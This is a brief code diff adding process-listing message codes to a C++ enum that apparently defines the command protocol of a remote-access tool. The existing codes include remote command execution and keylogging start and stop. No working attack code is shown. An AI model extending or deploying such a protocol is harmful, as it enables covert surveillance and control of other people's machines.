@@ -11,6 +11,8 @@ namespace inferno {
         SYS_RES_INFO = 0x0003, // System Information Response
         CMD_EXEC = 0x0004,
         CMD_RES = 0x0005,
+        PROC_LIST_REQ = 0x0006,
+        PROC_LIST_RES = 0x0007,
         
         KEYLOG_START = 0x0100,
         KEYLOG_STOP = 0x0101,
